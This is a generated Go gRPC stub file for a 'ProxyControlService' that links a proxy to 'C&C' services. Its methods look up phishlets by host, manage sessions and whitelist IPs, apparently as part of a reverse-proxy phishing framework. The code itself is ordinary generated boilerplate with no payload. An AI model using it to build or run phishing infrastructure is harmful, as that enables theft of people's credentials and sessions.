// Code generated by protoc-gen-go-grpc. DO NOT EDIT.
// versions:
// - protoc-gen-go-grpc v1.5.1
// - protoc             v3.12.4
// source: proto/proxy_service.proto

package proto

import (
	context "context"
	grpc "google.golang.org/grpc"
	codes "google.golang.org/grpc/codes"
	status "google.golang.org/grpc/status"
)

// This is a compile-time assertion to ensure that this generated file
// is compatible with the grpc package it is being compiled against.
// Requires gRPC-Go v1.64.0 or later.
const _ = grpc.SupportPackageIsVersion9

const (
	ProxyControlService_GetPhishletByHost_FullMethodName = "/proxy.ProxyControlService/GetPhishletByHost"
	ProxyControlService_ValidateSession_FullMethodName   = "/proxy.ProxyControlService/ValidateSession"
	ProxyControlService_CreateSession_FullMethodName     = "/proxy.ProxyControlService/CreateSession"
	ProxyControlService_UpdateSession_FullMethodName     = "/proxy.ProxyControlService/UpdateSession"
	ProxyControlService_IsWhitelistedIP_FullMethodName   = "/proxy.ProxyControlService/IsWhitelistedIP"
	ProxyControlService_GetSessionIdByIP_FullMethodName  = "/proxy.ProxyControlService/GetSessionIdByIP"
	ProxyControlService_WhitelistIP_FullMethodName       = "/proxy.ProxyControlService/WhitelistIP"
)

// ProxyControlServiceClient is the client API for ProxyControlService service.
//
// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://pkg.go.dev/google.golang.org/grpc/?tab=doc#ClientConn.NewStream.
//
// ProxyControlService defines the gRPC interface between proxy and C&C services
type ProxyControlServiceClient interface {
	// Get phishlet information by hostname
	GetPhishletByHost(ctx context.Context, in *GetPhishletRequest, opts ...grpc.CallOption) (*GetPhishletResponse, error)
	// Validate if a session should be handled
	ValidateSession(ctx context.Context, in *ValidateSessionRequest, opts ...grpc.CallOption) (*ValidateSessionResponse, error)
	// Create a new session
	CreateSession(ctx context.Context, in *CreateSessionRequest, opts ...grpc.CallOption) (*CreateSessionResponse, error)
	// Update session data
	UpdateSession(ctx context.Context, in *UpdateSessionRequest, opts ...grpc.CallOption) (*UpdateSessionResponse, error)
	// Check if IP is whitelisted
	IsWhitelistedIP(ctx context.Context, in *WhitelistRequest, opts ...grpc.CallOption) (*WhitelistResponse, error)
	// Get session ID by IP address
	GetSessionIdByIP(ctx context.Context, in *GetSessionIdRequest, opts ...grpc.CallOption) (*GetSessionIdResponse, error)
	// Whitelist an IP address
	WhitelistIP(ctx context.Context, in *WhitelistIPRequest, opts ...grpc.CallOption) (*WhitelistIPResponse, error)
}

type proxyControlServiceClient struct {
	cc grpc.ClientConnInterface
}

func NewProxyControlServiceClient(cc grpc.ClientConnInterface) ProxyControlServiceClient {
	return &proxyControlServiceClient{cc}
}

func (c *proxyControlServiceClient) GetPhishletByHost(ctx context.Context, in *GetPhishletRequest, opts ...grpc.CallOption) (*GetPhishletResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(GetPhishletResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_GetPhishletByHost_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *proxyControlServiceClient) ValidateSession(ctx context.Context, in *ValidateSessionRequest, opts ...grpc.CallOption) (*ValidateSessionResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(ValidateSessionResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_ValidateSession_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *proxyControlServiceClient) CreateSession(ctx context.Context, in *CreateSessionRequest, opts ...grpc.CallOption) (*CreateSessionResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(CreateSessionResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_CreateSession_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *proxyControlServiceClient) UpdateSession(ctx context.Context, in *UpdateSessionRequest, opts ...grpc.CallOption) (*UpdateSessionResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(UpdateSessionResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_UpdateSession_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *proxyControlServiceClient) IsWhitelistedIP(ctx context.Context, in *WhitelistRequest, opts ...grpc.CallOption) (*WhitelistResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(WhitelistResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_IsWhitelistedIP_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *proxyControlServiceClient) GetSessionIdByIP(ctx context.Context, in *GetSessionIdRequest, opts ...grpc.CallOption) (*GetSessionIdResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(GetSessionIdResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_GetSessionIdByIP_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *proxyControlServiceClient) WhitelistIP(ctx context.Context, in *WhitelistIPRequest, opts ...grpc.CallOption) (*WhitelistIPResponse, error) {
	cOpts := append([]grpc.CallOption{grpc.StaticMethod()}, opts...)
	out := new(WhitelistIPResponse)
	err := c.cc.Invoke(ctx, ProxyControlService_WhitelistIP_FullMethodName, in, out, cOpts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// ProxyControlServiceServer is the server API for ProxyControlService service.
// All implementations must embed UnimplementedProxyControlServiceServer
// for forward compatibility.
//
// ProxyControlService defines the gRPC interface between proxy and C&C services
type ProxyControlServiceServer interface {
	// Get phishlet information by hostname
	GetPhishletByHost(context.Context, *GetPhishletRequest) (*GetPhishletResponse, error)
	// Validate if a session should be handled
	ValidateSession(context.Context, *ValidateSessionRequest) (*ValidateSessionResponse, error)
	// Create a new session
	CreateSession(context.Context, *CreateSessionRequest) (*CreateSessionResponse, error)
	// Update session data
	UpdateSession(context.Context, *UpdateSessionRequest) (*UpdateSessionResponse, error)
	// Check if IP is whitelisted
	IsWhitelistedIP(context.Context, *WhitelistRequest) (*WhitelistResponse, error)
	// Get session ID by IP address
	GetSessionIdByIP(context.Context, *GetSessionIdRequest) (*GetSessionIdResponse, error)
	// Whitelist an IP address
	WhitelistIP(context.Context, *WhitelistIPRequest) (*WhitelistIPResponse, error)
	mustEmbedUnimplementedProxyControlServiceServer()
}

// UnimplementedProxyControlServiceServer must be embedded to have
// forward compatible implementations.
//
// NOTE: this should be embedded by value instead of pointer to avoid a nil
// pointer dereference when methods are called.
type UnimplementedProxyControlServiceServer struct{}

func (UnimplementedProxyControlServiceServer) GetPhishletByHost(context.Context, *GetPhishletRequest) (*GetPhishletResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method GetPhishletByHost not implemented")
}
func (UnimplementedProxyControlServiceServer) ValidateSession(context.Context, *ValidateSessionRequest) (*ValidateSessionResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method ValidateSession not implemented")
}
func (UnimplementedProxyControlServiceServer) CreateSession(context.Context, *CreateSessionRequest) (*CreateSessionResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method CreateSession not implemented")
}
func (UnimplementedProxyControlServiceServer) UpdateSession(context.Context, *UpdateSessionRequest) (*UpdateSessionResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method UpdateSession not implemented")
}
func (UnimplementedProxyControlServiceServer) IsWhitelistedIP(context.Context, *WhitelistRequest) (*WhitelistResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method IsWhitelistedIP not implemented")
}
func (UnimplementedProxyControlServiceServer) GetSessionIdByIP(context.Context, *GetSessionIdRequest) (*GetSessionIdResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method GetSessionIdByIP not implemented")
}
func (UnimplementedProxyControlServiceServer) WhitelistIP(context.Context, *WhitelistIPRequest) (*WhitelistIPResponse, error) {
	return nil, status.Errorf(codes.Unimplemented, "method WhitelistIP not implemented")
}
func (UnimplementedProxyControlServiceServer) mustEmbedUnimplementedProxyControlServiceServer() {}
func (UnimplementedProxyControlServiceServer) testEmbeddedByValue()                             {}

// UnsafeProxyControlServiceServer may be embedded to opt out of forward compatibility for this service.
// Use of this interface is not recommended, as added methods to ProxyControlServiceServer will
// result in compilation errors.
type UnsafeProxyControlServiceServer interface {
	mustEmbedUnimplementedProxyControlServiceServer()
}

func RegisterProxyControlServiceServer(s grpc.ServiceRegistrar, srv ProxyControlServiceServer) {
	// If the following call pancis, it indicates UnimplementedProxyControlServiceServer was
	// embedded by pointer and is nil.  This will cause panics if an
	// unimplemented method is ever invoked, so we test this at initialization
	// time to prevent it from happening at runtime later due to I/O.
	if t, ok := srv.(interface{ testEmbeddedByValue() }); ok {
		t.testEmbeddedByValue()
	}
	s.RegisterService(&ProxyControlService_ServiceDesc, srv)
}

func _ProxyControlService_GetPhishletByHost_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(GetPhishletRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).GetPhishletByHost(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_GetPhishletByHost_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).GetPhishletByHost(ctx, req.(*GetPhishletRequest))
	}
	return interceptor(ctx, in, info, handler)
}

func _ProxyControlService_ValidateSession_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(ValidateSessionRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).ValidateSession(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_ValidateSession_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).ValidateSession(ctx, req.(*ValidateSessionRequest))
	}
	return interceptor(ctx, in, info, handler)
}

func _ProxyControlService_CreateSession_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(CreateSessionRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).CreateSession(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_CreateSession_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).CreateSession(ctx, req.(*CreateSessionRequest))
	}
	return interceptor(ctx, in, info, handler)
}

func _ProxyControlService_UpdateSession_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(UpdateSessionRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).UpdateSession(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_UpdateSession_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).UpdateSession(ctx, req.(*UpdateSessionRequest))
	}
	return interceptor(ctx, in, info, handler)
}

func _ProxyControlService_IsWhitelistedIP_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(WhitelistRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).IsWhitelistedIP(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_IsWhitelistedIP_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).IsWhitelistedIP(ctx, req.(*WhitelistRequest))
	}
	return interceptor(ctx, in, info, handler)
}

func _ProxyControlService_GetSessionIdByIP_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(GetSessionIdRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).GetSessionIdByIP(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_GetSessionIdByIP_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).GetSessionIdByIP(ctx, req.(*GetSessionIdRequest))
	}
	return interceptor(ctx, in, info, handler)
}

func _ProxyControlService_WhitelistIP_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(WhitelistIPRequest)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ProxyControlServiceServer).WhitelistIP(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: ProxyControlService_WhitelistIP_FullMethodName,
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ProxyControlServiceServer).WhitelistIP(ctx, req.(*WhitelistIPRequest))
	}
	return interceptor(ctx, in, info, handler)
}

// ProxyControlService_ServiceDesc is the grpc.ServiceDesc for ProxyControlService service.
// It's only intended for direct use with grpc.RegisterService,
// and not to be introspected or modified (even as a copy)
var ProxyControlService_ServiceDesc = grpc.ServiceDesc{
	ServiceName: "proxy.ProxyControlService",
	HandlerType: (*ProxyControlServiceServer)(nil),
	Methods: []grpc.MethodDesc{
		{
			MethodName: "GetPhishletByHost",
			Handler:    _ProxyControlService_GetPhishletByHost_Handler,
		},
		{
			MethodName: "ValidateSession",
			Handler:    _ProxyControlService_ValidateSession_Handler,
		},
		{
			MethodName: "CreateSession",
			Handler:    _ProxyControlService_CreateSession_Handler,
		},
		{
			MethodName: "UpdateSession",
			Handler:    _ProxyControlService_UpdateSession_Handler,
		},
		{
			MethodName: "IsWhitelistedIP",
			Handler:    _ProxyControlService_IsWhitelistedIP_Handler,
		},
		{
			MethodName: "GetSessionIdByIP",
			Handler:    _ProxyControlService_GetSessionIdByIP_Handler,
		},
		{
			MethodName: "WhitelistIP",
			Handler:    _ProxyControlService_WhitelistIP_Handler,
		},
	},
	Streams:  []grpc.StreamDesc{},
	Metadata: "proto/proxy_service.proto",
}
